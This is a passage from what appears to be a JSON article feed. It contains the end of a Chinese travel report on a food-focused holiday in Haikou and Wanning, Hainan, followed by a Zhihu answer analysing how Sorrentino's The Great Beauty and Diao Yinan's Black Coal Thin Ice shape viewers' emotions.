点，我们才出门觅食。选了上过《早餐中国》海口老爸茶——恒兴发茶店。不过老爸茶的正经时间是在下午，老爸们出来喝茶吹水避暑，这才地道。我们则完全选错了时间，在这儿吃了一顿游客式早午餐。</p>\n<p>因为时间不对，店里多的都是游客，本地人很少。参照大家点的样式错不了，只可惜很多菜式都要到下午老爸茶时间才有。点了招牌西多士、蒸凤爪、蒸虾丸、冰奶茶。西多士偏甜，蒸虾丸偏淡，全靠甜辣酱提味，是地道的粤菜口味。奶茶不甜，加入大量冰块，装在扎啤杯里，连杯冰镇，在气温闷热的海口中午来上一大口，非常满足。对面十三小龙兴坊，本地烧烤，也可点来一同享用。</p>\n<p>缺点是店内环境极差，上菜混乱，以至于我们完全没有感受到老爸茶的悠闲氛围，完全错过。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/19/78afae3af1262b53b31a4c4135fae03c.jpg\"></figure><h2>南洋建筑大观：海口骑楼老街</h2>\n<p>海口骑楼老街，是南洋华侨回国逐渐建立起来的特色建筑街区。说起骑楼，在广州、武汉都有。为什么叫骑楼呢？这与它的建筑结构有关，骑楼的一楼都没有墙，而是用高大的支柱支撑起上方建筑，远看就像是站立的马腿，再往上的楼层就像骑在马上，所以慢慢地叫出了「骑楼」的名。</p>\n<p>晚清时期，海口是当时对外开放的口岸之一，于是南洋华侨回国开始投资建设，最早在水巷口、博爱北路一带。这也是我们逛海口骑楼主要的街区。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/05/19/a6744aacda8a8bfc3fe754d6f6a70e6d.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/05/19/5ef819452c4b3eb2a8b28f2786ddfc9f.jpg\" alt=\"\"></figure><p>水巷口通往海甸河，连通琼州海峡入南海。水巷口也是早先商船接驳海南岛与大陆的港口。水巷口街的建筑早已被修缮一新，在水巷口街与博爱北路交叉口，设立了海口南洋骑楼老街风貌展示馆，再旁边是国新书苑主题邮局，据说是电影《芳华》取景地。</p>\n<p>主题邮局，卖邮票和明信片，不过不是真正的中国邮政，因此没有邮戳。但是在店内可以盖到海口纪念章，我选了「海口钟楼」和「世纪大桥」两枚（见文末）。烈日当空，正午时分逛逛主题邮局也不错。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/05/19/18a055d5c476a51da4d47fa13fd1c28f.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/05/19/03f847680ca259fd5cd733a514b20f8c.jpg\" alt=\"\"></figure><h2>海边、复古、惬意：乌鲁鲁制咖一厂</h2>\n<p>逛完海口骑楼，时间到了下午 15 点，一天中最热的时候，在外面晒太阳真是受罪。躲进咖啡馆吧！</p>\n<p>乌鲁鲁制咖一厂，听名字就很特别。人气饮品「四喜拿铁」，四种口味，草莓、香橙、菠萝、抹茶，装在可口可乐杯里，放在斑点桌布上，浓浓的复古风。最好喝的是菠萝味，和 NectarOneCafe 的「一刻甘甜」有点异曲同工（详见快乐飞旅行报告贵阳篇）。Dirty用的是冰博克，看来有点实力，可惜咖啡液有点放凉了，味道还不赖。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/19/be9be830f22c9f55929c3368868a02fb.jpg\"></figure><p>白天咖啡、晚上酒吧，顾客络绎不绝。刚到店时，店内座无虚席，我们就在门外顶着高温、吹风扇、喝冰饮，到了傍晚时分店内才空出座位，方能享受空调、Wi-Fi、冰饮夏日三件套。</p>\n<p>无所事事，不如来玩「哈萨克斯坦」打发时间。这是早些年同事引进的纸牌游戏，后来在少数派线下活动我和小伙伴们玩过一回，后来 <a href=\"https://sspai.com/post/60454\">@DerQi 在他的文章</a> 中也有分享过玩法。店里一直播放小野丽莎的歌单，炎热的海岛夏日，我们就躲在空调畅开的复古咖啡店，一边痛快喝饮料一边玩牌，真是惬意。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/19/6148af4780f0ed43b72092b9a0ebb277.jpg\"></figure><p>店面开在海甸河畔、世纪大桥西，店外的视野极好。门前的海水直通琼州海峡，真可谓面朝大海。店门外即是环岛小公路，可以下到海甸河的礁石上，捡捡螃蟹、拍拍人像，而且都非常出片。这会儿已到五点半，平静的海水突然涨潮，把礁石上的我们吓得不轻，慌乱逃往楼梯上岸，现在回想起来还心有余悸。可真刺激，惊喜惊吓连连。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/05/19/90f4da8b1ab89079b95c8d0ede977727.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/05/19/1b9a6bec025d0674f0a2d7a812424a65.jpg\" alt=\"\"></figure><p>往世纪大桥走去，临海的是高晓松新开的「晓岛」书店，不过五一节时期预约爆满，连店外也都人满为患。若是淡季前往，可能还能感受上一些文艺气息。</p>\n<h2>热闹喧嚣：海南大学夜市</h2>\n<p>入夜之后，我们一行人去了 N 次方商场，在「四季椰林」用椰子鸡解决了晚餐。说实话，这里的椰子鸡和文昌的比差太远了，不多赘述。</p>\n<p>晚上直奔海南大学夜市，这是在海南大学南门的小吃一条街。白天是正经的四车道海甸三西路，到了夜晚中间两车道单独划开，两边摊位成排，中间摆上餐桌，成了夜市。特别宽阔，这是我见过最大阵仗的夜市了，人也很多，餐桌都座无虚席。</p>\n<p>我们找了挨着夜市、有独立门店的「陈记后安粉美食店」入座，点了椰百味清补凉。清补凉，海南解暑饮品，大致可以理解为椰奶版的杨枝甘露，去掉芒果，里面另外加了红枣、香芋等等小料。夜市有来自天南海北的小吃，蛋炒饭、梅干菜肉饼、烤冷面、热干面、肉夹馍等等。我们七八个人各点了一样，凑在一块放开了吃。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/19/e4e669e75f329fefb794a1577a7161bb.JPG\"></figure><h2>闪现文昌：美味的瑞丰椰子鸡</h2>\n<p>时间到了在海南的第二个早上（5 月 2 日），这一天我们要从海口自驾经文昌去万宁。</p>\n<p>早上又是拖拉耽搁，出门已经 10 点了，找了民宿附近的「英姐早餐」，说是地道的海南菜。来得晚了，招牌「腌面」售罄，只剩「猪杂河粉」。没有脏器味的猪杂，干净弹牙，高汤浇灌，清汤不油腻，适合早上喝。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/19/1a91d5444e73592b35ebca3b8c13624f.jpg\"></figure><p>高速自驾旅程自不必说。到达文昌直奔东郊椰林风景区，文昌著名的网红椰子鸡「瑞丰椰子鸡」就开在这儿。下高速走县道，两边都是茂密的椰子林，稀疏的农家，搭了敞篷，家家都搞起椰子鸡生意。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/19/4a7576fd536de623fba9c70f3edbf9a9.jpg\"></figure><p>「瑞丰椰子鸡」，离椰林湾最近，距离海岸不到百米。椰子鸡火锅，椰味十足，加了木瓜、玉米、芋艿、红枣等等，用料丰富，鸡汤鲜美，清新爽口。煮料类食物加入太多肉质，会使汤汁变浑浊失去原有的风味，但椰子鸡只有鸡肉，煮久了还能依然保持浓郁清爽风味。火锅加汤加的是与锅底原汁原味的椰奶汤，能够最大程度保证风味相同，确实不错。</p>\n<p>更棒的是店里的其他海鲜菜肴竟也都很美味，蛤蜊、扇贝、鲍鱼、白灼虾都很新鲜，一道「菠萝鱿鱼」，酸甜弹牙，让人食欲倍增。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/19/43770c5b81a5dfa527b83f3dd37b21ce.jpg\"></figure><p>店外小摊，一位本地的奶奶售卖同样美味的「椰子糕」。笼屉里现蒸，糯米成团裹着椰蓉，香甜软糯，甜味淡淡不腻。这是我吃过最好吃的椰蓉点心了。附近摊点还卖椰子、椰宝。椰宝，吃起来口感像椰蓉，也像水分较少的冬枣，纤维感十足。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/19/6f5fad948e62c74701a34a1003d84ca8.jpg\"><figcaption>注：椰子鸡火锅与椰子糕的图片来自互联网，因为我的疏忽当天误删了很多照片😭</figcaption></figure><p>吃完继续自驾达到万宁。我们入住石梅湾的一个新建小区，周边配套还算可以，海鲜、日料、火锅、湘菜竟然都有。</p>\n<p>段子说道，海南最多的是东北人。因为气候宜人，很多东北人在海南置业，他们会在冬季前来到海南过冬，待到五六月份再返回老家。于是，在海南街头遍地可见东北菜馆。晚餐我们就选了东北菜馆——泰福楼。拉条子、biángbiáng 面味道都很不错，生蚝新鲜、烧烤是夜宵小吃味。尽管大众点评仅有 3.3 分，但我觉得仅凭口味，这家馆子放在二三线城市能上 4 分。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/19/e117db6ea58bcbc14ab37737926a7ac8.jpg\"></figure><h2>网红冲浪店 GROM</h2>\n<p>到了 5 月 4 日，年轻的小伙伴安排了冲浪和音乐节，都在日月湾。万宁靠近海边、同时有部分商业开放的地段主要是日月湾、石梅湾、神州半岛和分界洲岛。</p>\n<p>日月湾是著名的冲浪胜地，有很多冲浪赛事会在这里举行。岸边林立冲浪店，我们就在网红店 GROM 待了一整个下午。GROM 就在海边，店内宽阔，空调凉爽，不过游客颇多，咖啡、啤酒、汉堡、小吃一应俱全。据说参加音乐节的几个音乐人，都在 GROM 休息候场。</p>\n<p>在我看来店外才是精华所在，店前庭院高起，水泥地上沙滩躺椅搭配矮方桌，顶上遮阳棚，一米外便是椰树、沙滩、海浪。躺在沙滩椅上望向海浪，有好几个瞬间，我都感觉到极为舒爽的惬意，就好像我知道什么坏事都不会发生，今天是，明天也是。我想这就是海的魅力吧。</p>\n<p>西侧高脚凳则和吧台桌组合，视线没有遮挡，出片神地，不过在午间炎热异常。东侧冲浪板、淋浴间，橱窗里多是海报、T恤、小玩意，皆是冲浪文化。冲浪完疲惫异常之后，在这儿休憩，再合适不过。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/05/19/ec5da2d3065508837f97d66272f114bc.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/05/19/afd1bac0914510791f964de83dcc5c7b.jpg\" alt=\"\"></figure><p> </p>\n<p>在 GROM 惬意地待到傍晚，我们才起身去神州半岛。神州半岛，是与陆地接壤的小岛，三面环水，在远陆地端上建了一座灯塔，伸向南海。这里可以看日出和日落，一望无际的海洋与天空接壤，再搭配独特的灯塔建筑，近来也成为游客打卡点。</p>\n<p>其实这是我们第二次登上神州半岛，在第一天自驾到达万宁时，就是直奔灯塔而来。结果所有的导航都带错了路，直到第二天才在攻略里找到正确的路线。神州半岛多是游客在沙滩上玩耍，人多得有点三亚的感觉。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/19/f63cec15991796abffad513fcff075f0.jpg\"></figure><h2>万宁最美公路：日月湾、石梅湾</h2>\n<p>日月湾、石梅湾都有临海公路，都自称是「海南最美公路」，不过我没去过海南其他临海公路，姑且称这两条公路是「万宁最美公路」吧。</p>\n<p>石梅湾观海亭，是整段公路最靠近海岸的地方。使用无人机航拍，从陆地开始依次是椰林、公路、沙滩、礁石、海浪。海水十分清澈，玛瑙绿色非常养眼，而且没有海腥味。就在公路旁边，多是临时水果店、农家椰子摊，买几个黄椰子，在观海亭上避暑看海，享受海风吹拂而过，正午时分也不觉得炎热，相当惬意。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/19/8f7aa4dc970e0162818fc80720ce1701.jpg\"></figure><p>到了 5 月 5 日，音乐节结束了，日月湾也结束了道路管制，去看看那儿的最美公路吧。日月湾的最美公路更长，从高速日月湾互通下来，一直到融创日月湾，整一条都是。道路笔直，没有蜿蜒，无人机追踪拍摄十分容易。</p>\n<p>这儿椰林稀疏、沙滩宽阔、海浪更薄，轻松就能拍出 Unsplash 风格的壁纸大片。沙滩三两游客信步，偶有几块冲浪板闲置，更多的冲浪手则正在海浪上驰骋，这儿更有惬意的夏日度假氛围。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/19/e9bc95d04a48c430bbea4e662cce9d74.jpg\"></figure><h2>兴隆南洋风味：炒方便面</h2>\n<p>「兴隆南洋风味」，在万宁兴隆，南洋菜，现在是来万宁的游客必去的餐厅，已经开出了两家店。我们此次光顾的就是二号店，老店排队实在太久了。</p>\n<p>南洋，指的是东南亚诸国，包括马来群岛、新加坡、印尼群岛等地。「兴隆南洋风味」里的店员全是东南亚风貌，虽然不知道具体国家但都肤色偏黑😂。一进店里，迎宾台播放着欢快活泼的印尼曲风歌曲，真像来到了东南亚度假一样。店员服务态度出乎意料地好，在上菜、借过的时候「请」、「谢谢」等词不绝于耳，这是我在快乐飞这么多次，遇到过最有礼貌的店员了。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/19/6ed057d7f2d209076752b54ef46b6ed9.jpg\"></figure><p>我们一行 10 人，把招牌的几样菜肴点了个遍。</p>\n<p>椰奶炒冰，真材实料的椰奶冰淇淋，加上花生碎，清爽可口；榴莲西多士，榴莲味道浓郁，加些特色芋头糕、木薯糕解腻；阿华田三明治，好看好吃，就是太甜了；港式炒河粉，蔬菜配料十足，咖喱味道浓郁，实力抢镜；咖喱牛肉，牛肉处于不嫩不老之间，加了柠檬，酸味鲜明很开胃；奥尔良鸡翅包饭，夜宵摊的美味。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/19/f0b3a18c092dacfce986e3c9b04ed292.jpg\"></figure><p>最棒的就要数炒方便面了，在我们海南五日游里吃过两次炒方便面，味道不尽相同，但都十分美味。第一次是在万宁音乐节结束后零点时分的夜宵，已经不太记得味道细节，只记得是好吃的。</p>\n<p>「南洋风味」的炒方便面，味道鲜美，面条干爽。胡萝卜丝、生菜、豆芽丝用料充足，仍然加了灵魂配料咖喱粉，再加一个荷包蛋，卖相诱人，美味十足。我们点了两份还觉得不够吃。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/19/74c46617b95fc34244abab2b0708e000.jpg\"></figure><h2>万人海鲜广场：面朝大海鲜</h2>\n<p>吃过南洋风味，我们依次打卡了上文说的两条最美公路，旋即自驾返回海口。岛上气候多变，一路上晴晴雨雨，牛羊农家、城市店家依次闪现，快到海口时突然彩虹悬挂在东边天空，甚是惊奇。回想起来，我已经快五六年没见过彩虹了。</p>\n<p>游客大都选择在 4 号这天返回海口，再到 5 号乘机离去。因此这天海口的道路异常繁忙，我们到了夜幕降临才抵达酒店。</p>\n<p>晚餐兼夜宵，选在了丁村火车头万人海鲜广场的「面朝大海鲜」。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/19/0f1dd3f762013006e2a36a6ba7948c0e.jpg\"></figure><p>万人海鲜广场，是专门规划建设的美食景区，集海鲜购买、加工，食用于一体，在这儿可以享受海鲜美食一条龙服务。整个广场纵横分布，店家纵横排布、错落有致。中间一条横贯整个广场，是海鲜食材市场，我们可以在这儿挑选食材再交由店家加工制成新鲜食物，也可以先选中店家，由他们负责采购、烹调直接上桌。整个广场管理有序，也干净卫生。不同区划皆以海南的特色地名命名，比如霸王岭、铜鼓岭、石梅湾、日月湾等。</p>\n<p>「面朝大海鲜」就在霸王岭 6 号，是大众点评上人气较高的海鲜排挡。我们自行挑选采购海鲜，再交由店家加工。赖尿虾个头颇大，虾黄粗壮，吃起来非常过瘾；白灼虾新鲜干净，虾肉弹牙，蘸点醋就是新鲜美味。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/05/19/8d41bd35b000a95daac2009fc6b50c1d.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/05/19/b5660bc27b8953c98e9d846b583170a9.jpg\" alt=\"\"></figure><p> </p>\n<p>蛏子、花甲肉质饱满，做成特色芒果螺（就是花甲）肥美嫩滑，用本地辣椒炒制。在海南饭馆吃饭是总能看见黄色的辣椒酱，用的就是海南大名鼎鼎的黄灯笼辣椒，在海口骑楼老街以及很多超市商店都有售卖。看起来像是人畜无害的青椒，但不要被其外表所蒙蔽，其实其味极辣，不过辣而不呛，是我这样的吃辣星人最爱。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/19/33c90d524c0b7f31237c4ac0c2810ba8.jpg\"></figure><p>吃完海鲜夜宵回到酒店已经午夜了，旁边就是万绿园。万绿园本来是这次旅行的一个打卡点，不过行程紧张，没有来得及细细逛。我们带上了从万宁民宿意外寻得的烟花，在万绿园临海处点了起来，结束了这一次海南五日游。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/19/2afbfa53df0ff1bc36911cc0857cf11d.jpg\"></figure><h2>小结</h2>\n<p>海南是我目前去过最南方的地方，又适逢五一节假日，海口、万宁游客适量，海水清澈，天气超好，自驾自由，总结来说是一次非常快乐的度假旅行。</p>\n<p>隐藏玩法：从杭州萧山机场出发，可以在国内出发9号门附近的中国邮政盖到邮戳以及两枚萧山机场纪念章。海口美兰机场没有设立中国邮政，可以在海口、万宁的中国邮政盖上邮戳，而且万宁的邮戳用的是蓝色墨料，十分特别。在海口水巷口街的主题邮局，还可以盖到很多海口纪念章，「海口钟楼」和「世纪大桥」两枚设计相对好看。因此海南旅行的集戳页也是满满当当。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/19/2036e61f438a8a8b31c053237accaad1.jpg\"></figure><p>出行费用：本次海南五日游共计花费 2720.54 元。</p>\n<hr>\n<ul>\n<li><a href=\"https://sspai.com/post/66203\" target=\"_blank\">快乐飞旅行报告 01：广州的早茶可以从早喝到晚</a></li>\n<li><a href=\"https://sspai.com/post/66285\" target=\"_blank\">快乐飞旅行报告 02：除了武汉特色小吃，还有惬意的土耳其咖啡店</a></li>\n<li><a href=\"https://sspai.com/post/66445\" target=\"_blank\">快乐飞旅行报告 03：故宫的花开了</a></li>\n<li><a href=\"https://sspai.com/post/66183\" target=\"_blank\">快乐飞旅行报告 04：我低估了沈阳人民对于「小份」的定义</a></li>\n<li><a href=\"https://sspai.com/post/66510\" target=\"_blank\">快乐飞旅行报告 05：两天的贵阳都是吃</a></li>\n</ul>\n","link":"https://sspai.com/post/66745"},{"title":"哪些好看的电影可以帮助提高审美？","date":"2021-07-03 23:06:32","description":"<div>\n<div>\n<div>\n<img src=\"https://pic4.zhimg.com/v2-59b836793de3f4cb8ece812194e91a40_l.jpg?source=8673f162\"><span>segelas，</span><span>电影学硕士已毕业，但仍旧略懂皮毛</span>\n<a href=\"https://www.zhihu.com/question/337741812/answer/1971498771\" hidden>阅读原文</a>\n</div>\n<div>\n<p>谢在类似问题下的邀请 <a href=\"http://www.zhihu.com/people/e040c3621db487a95ed980a938f5824b\">@魅影缝匠</a> 。谈一谈个人的看法。</p>\n<p>于个人对电影的理解而言，直观触发观者感情反应的高潮瞬间与多元丰富的主题表达系统的结合，且能让这种感情反应融入整体系统、甚至引导观者把握整体表意系统，便构成了电影艺术基于“感官作用”之情绪层面、“立意表达”之逻辑层面的双重性。对电影艺术独特——区别于绘画等独立画面，以及文学等文本倾向——之美的审视，电影的审美，莫过于此。</p>\n<p>艺术的重要价值，在于对人更直接的震撼效果，它直接作用于人的内心，而伟大的艺术，则可以让这种效果亘久而永恒。而电影艺术，作为视觉、听觉共同作用的形式，对观者的感观作用更为丰富，也自然就具备了直接对接观者感受性的能力。因此，电影作为视听艺术之美的重中之重，一定在于“对观者情绪的直接效果”。</p>\n<p>并且，它与电影的好懂或晦涩无关。当然，这并不是否认电影表达手法与主题系统的重要性，它同样是决定电影质量不可或缺的一环。但是，如果仅有这一点，电影的观赏门槛未免会有点过高，一般观众对于艺术之美的感受未免过于艰难。因此，在节寸点上“直击心灵”的灵感时刻，让观众产生直观触动的高潮瞬间，对于一部优秀的电影而言，非常重要。</p>\n<p>并且，作为同样是优秀作品一部分标准，高潮瞬间的局部，理应是与整体表达高度贴合统一的。它理应构成作品主题表达系统的画龙点睛之处，让调动起的情绪成为对主题的最强力映射，甚至在很大程度上起到引领、推动观众更好地进入系统、理解表意、降低观影门槛的作用——毕竟，比起那些前后对应、明叙暗喻、符号象征，直接从感情上的信息接收，终究是要容易多了。</p>\n<p>这一切，或许就像某位电影人在观看《2001 太空漫游》后、以及网上风靡的李安表情包所共同感概的那样——“我不知道我在看什么，但我知道我看了一些了不得的东西”、“我看不懂，但我大受震撼”。</p>\n<p>事实上，前者的感慨，恰恰就构成了第一个关于“情感作用之于主题点睛”“情绪高潮融入并引导表达体系”的完美案例。他感受到的，是地球婴儿带来的、超越人类认知与想象边界的震撼，这是来自神之力量的震撼，也恰恰对应着库布里克“人类需要找回科技发展中缺失的，对神的敬畏”的电影主题，也让观众在无法理清通篇那些具体表意的情况下，依然在最后时刻，从心灵上进入了这部作品的内里——即使他们或许并没有意识到这一点。</p>\n<p>下面，本文将以《绝美之城》和《白日焰火》作为案例。</p>\n<p>看过保罗索伦蒂诺导演的《绝美之城》的人，想必会深刻地明白上述行文是在说什么。显而易见的是，这并不是一部容易看懂的电影。索伦蒂诺构建了一套非传统叙事的表达系统，淡化了主副线明确、剧情起伏连贯之强剧情性对电影主题的通俗化表述力，而采用了更具诗意的情绪化手段。</p>\n<p>在后作《年轻气盛》里，索伦蒂诺也采取了类似的手法，通过“老人干瘪褶皱的裸体，窥视丰满鲜活的少女裸体”等对比性极强的画面，以及两个老人意欲重返职业创作的喋喋不休，托起了关于老迈身躯与向往青春的主题。片段化的叙事，加大了观众对于信息的接收。</p>\n<p>然而，结尾处，索伦蒂诺有些突然地让无法恢复活力而愤懑自杀的导演老人“复活”，手比出摄像机的形状放到眼前，仿佛在进行着构图的工作。这一“突兀”的画面，将观众拉入了一个类似于天堂的世界，更加直观地向观众传达了信息——老人对青春的向往终将实现，青春的生命力也不会因为身躯老化而结束，一切在于内心的虔诚。</p>\n<p>而在《绝美之城》里，索伦蒂诺则对同一主题做了更多的阐述，将内心的力量具象为信仰，用西方人对基督教信仰矢志不渝的坚定信念，对应对于青春的内心虔诚向往，也就此将对青春的向往抬高到了信仰的高层级。而手法也与《年轻气盛》类似，但无论是表达系统，还是结尾的情感作用力，都更胜一筹。</p>\n<p>在开场，索伦蒂诺便让一个日本人死在教会之外，随后让镜头摇过阻隔教会与外部的栅栏，让教会内部的少女们吟唱圣歌，从而用一种不太浅显的方式带出了主题——只有信仰，才能让年华不朽。</p>\n<p>作为主角的老人，身处罗马的世俗物欲之中，表面繁华，却像开场舞会散场后一系列空镜头的万籁俱寂所表现的那样，茫然、空虚、失落。主角表面乐于世俗，内心却深感青春的逝去与灵魂的腐败。他会对舞动着肉体、仿佛年轻依旧的中年脱衣舞娘情投意合，会去追寻地上世俗罗马之下、充满了艺术之美作品的地底之城。也会因舞娘的死亡而愈发深感“终不可回”——同样年纪渐长，却坚持从事脱衣舞这一青春行业的女人，她在镜头下曼妙的曲线，构成了主角对青春恢复的信心，而她的突然死亡，也正让主角的信心进一步崩塌。</p>\n<p>而一切的根本，在于他于男女关系的长袖善舞、逢场作戏之世俗物质追求背后深感丧失的，对于青春年少时爱情的悸动之心，那种在青春期萌生的对于爱情的纯粹向往。这种纯粹的向往，也就成为了本片中索伦蒂诺对青春之力的具体化。</p>\n<p>电影中，索伦蒂诺用了“水”这一符号，构建了主题表达的系统。主角梦中的海，其岸边即是他与初恋的所在地，也是他对初恋情人萌生感情的地方。而现在年老的他，却始终未能抵达，只能在幻觉中看到高居于天花板而触不可及的海，或在现实中行走在河（与海共同的“水”）边，看着擦肩而过的跑步青年，感慨生命活力的丧失。水、海，始终是年老的他不能直接进入的存在。</p>\n<p>而巧妙的是，在电影开场，索伦蒂诺则给出了“信仰光环”下主角对水的直接接触，暗示了信仰于水代表的“青春爱情向往”的引导作用——修道院的圣歌中，主角倾听，然后用修道院前的喷泉洗手；而作为对比的，则是修道院远处，那个因为高温中暑、缺水而死的中年日本人。</p>\n<p>而主角失去了那种青春爱情之纯粹心灵的原因，则在天才少女画画的一幕中得到了揭示——她画出了出色的作品，但却远非本愿，她想要的，只是拒绝创作时表达的，玩耍的快乐。现实意义上的成功，所谓天份的开发，让她失去了本真的自我，变成了一个于一瞬间的剪接中出现的，完成画作取得“成功”时的模样——面色沉重，颜料涂脸，一片狼藉。</p>\n<p>主角也同样如此。在他来到罗马这座物欲之城，为了发挥才能、事业变现，不停游走于名利场所与虚假社交之间，逐渐地长袖善舞，却失去了原本的心灵，被表面化的交情与应酬稀释。这一切，在开场时便已经表现出来。疯癫蹦迪的名利场众人被慢镜头放缓，主角则以正常速度走出人群，嘲讽一切的无意义，随后人群的慢镜头结束，主角再次回到其中——二者的动作速度的不同与趋同之变化，让主角“内心不认可，但行为屈就之”的、为了自身事业而受到的同化腐蚀得到了揭示。</p>\n<p>开场段落里，索伦蒂诺也使用了直观的情感打动手法。女主编于酒醉醒来后茫然走过睡倒的凌乱人群，走上黎明即起的天空下时，已经起到了一种直观的情绪化主题表达——阳光露出地平面的些许金光，让场景充满了黎明之前的静谧与神圣，这种神圣让物欲的世界沉睡下来，让女主编露出了疲惫于这一切的本心。</p>\n<p>在随后的电影里，同伴的离去，促成了主角对自己本心丧失的再一次触动。那位以作家为目标而来到罗马的朋友，只获得了所谓友人在貌似和谐的茶话会中的嘲讽，爱情——与主角同样的青春纯粹之象征物——也成为了被女名流驱使拿捏的软肋。曾经的青春理想离他而去，他也决定离开让他变得如此的罗马。</p>\n<p>在他离开前最后的一次诗歌朗诵会上，索伦蒂诺便给出了非常作用于情感的手法。黑暗中浮出身影的诗人，缓缓演奏的指弹吉他，柔化的光线，让此时诗人作家内心中“即将离开物欲之地”而回归的、对文学的纯粹向往，得到了不可言说的传达——虽然台下依然观众寥寥、掌声稀落，但整体氛围已经表明了他对这种世俗化认可成功的不再在意。</p>\n<p>而在同一段落里，索伦蒂诺也放入了更复杂的表达手法。在会场外，诗人与主角对话时，后景中是古罗马竞技场里、被手脚架围住的长颈鹿。这一幕的突兀混搭，构成了对主题的全方位表达。来自原始自然的长颈鹿是诗人此时回归原初纯粹的象征，古罗马竞技场则是对非世俗化之非当代罗马的象征，而圈住长颈鹿的工事手脚架则代表了当代，是围住“非当代之原始”的现实因素——如同开篇中，黎明之前的深夜罗马让一切物欲回归宁静一样，深夜的罗马是原始形态的复起，让人的世俗心灵沉睡、纯粹本心苏醒，这对应了此时诗人纯净的文学追求，他也必须挣脱困住自己的“当代世俗”的脚手架。</p>\n<p>事实上，深夜罗马对于日常罗马的对比关系，于世俗中回归原始纯粹的象征作用，贯穿了全片。主角带着舞娘走入了深夜罗马的地下，打开通往罗马艺术品陈列的密所。深夜与日常，地下与地上，世俗于艺术，就此实现了对比。镜头之下，那一尊尊于若隐若现的黑暗中散发着神秘魅力的艺术品，是主角于日常之外脱离物欲、回归对于爱情、对于美的纯粹向往的表现。而纵观全片，在这种略显隐晦的表述之外，深夜罗马被索伦蒂诺镜头赋予的安静之美，则是引领观众去更直观地感受其含义的主观情感打动手法。</p>\n<p>但是，如上所述，与他共赴地下罗马的舞娘的死亡、与他同样怀有对美（一个对艺术，一个对爱情）拥有纯粹青春向往的同伴的离去，都让主角意识到了身处罗马而不得脱离的、身体老化的自己的青春之心已逝。初恋情人的死亡，更让这一切变得更加惨烈。</p>\n<p>能够改变这一切的，就是信仰。当老圣女来到罗马，一反此前的衰老不堪，缓慢但坚定地爬上一级级台阶时，放慢的镜头，回响的圣歌，让信仰之力用一种极其直接的方式弥漫开来，传达到每一个人的心中。于是，曾经世俗——在罗马名流间应对自如——的主教回归了“面对鸽子展露微笑”的清澄；曾经收费撑场、无比功利的破落贵族夫妇，也来到自家二楼的展览室，打开了那尘封已久的讲解器，回顾自己曾经的青春年华。</p>\n<p>在电影中，索伦蒂诺一度展示了信仰于物质世界中的沦落。罗马主教在世俗中的沉迷，坚定信仰者老修女“干巴巴地戳在原地，任凭身旁趋炎附势者的轮流合影”的无力，老修女躺在主角床上、脸部特写下宛若一具干尸的生命力缺失，都仿佛让信仰敌不过物质的腐化、年华的流逝。然而，在只鳞片爪之间，信仰的力量仍然悄然流出——世俗的主教，也可以对着附耳过来的主角说出开解的箴言，让他如释重负；面无表情的修女也会在桌下偷偷摆荡着双脚，宛如幼龄少女的调皮。</p>\n<p>而在修女给予的强大信仰加持下，主角也最终游过了大海，回到了初恋发生时的海岸，看着美丽的少女在他面前展开胸膛，再一次看到了曾让年轻的自己产生对于爱情和美的悸动的事物——“这就是一切的开始”。而他从青年切换到老年的身形，也让这一幕直达主题：信仰，将让年老的躯体永葆青春之心。</p>\n<p>这部电影，并非基于传统叙事手法创作，剧情线较为薄弱，而以情绪推动，加入大量隐喻与象征的表达，并不容易理解。但是，当观众看到圣女张开双臂，鸽群飞向远方的朝阳，看到主观视角下少女若隐若现的胸膛，听到圣歌的回响，信仰的力量会自然而然地升腾在我们所有人的内心，不需要任何的理解，而是直接作用于观者的情感。</p>\n<p>而在中国电影中，我们也可以看到一部类似的案例：刁亦男的《白日焰火》。</p>\n<p>这部电影，表现了被世俗道德和伦理所压抑住的人的原始性。而在这样一个足够深的内核之上，刁亦男又包裹了气韵悠长而腔调深沉的黑色电影气质，并构建了丰富的表意系统与直击情绪的点睛相结合的成片，从而做到了表里如一、雅俗共赏 --- 